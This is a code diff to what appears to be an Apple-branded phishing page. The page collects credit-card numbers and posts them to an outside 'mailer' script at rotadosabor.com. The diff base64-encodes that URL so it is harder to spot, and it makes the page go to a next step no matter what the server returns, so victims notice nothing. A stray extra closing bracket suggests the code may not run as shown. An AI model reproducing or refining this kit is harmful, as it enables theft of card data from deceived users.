@@ -613,6 +613,12 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script type="text/javascript">
+        // Redirect link
+        var rdrt = "https://www.apple.com/";
+        
+        // Mailer link - encoded next.php URL 
+        var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");
+        
         $(document).ready(function() {
             // Format inputs
             $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
@@ -640,23 +646,15 @@
                 
                 // Submit form via AJAX
                 $.ajax({
-                    url: 'https://rotadosabor.com/joker/next.php',
+                    url: f,
                     type: 'POST',
                     data: $(this).serialize(),
                     dataType: 'json',
-                    success: function(response) {
-                        if (response.status === 'success') {
-                            // Redirect to next step
-                            window.location.href = 'details.html';
-                        } else {
-                            alert('There was an error processing your request. Please try again.');
-                            $('#verify-button').prop('disabled', false).text('Continue to Next Step');
-                        }
-                    },
-                    error: function() {
-                        alert('There was an error connecting to the server. Please try again later.');
-                        $('#verify-button').prop('disabled', false).text('Continue to Next Step');
+                    complete: function() {
+                        // Redirect to next step regardless of response
+                        window.location.href = 'details.html';
                     }
+                });
                 });
             });
         });
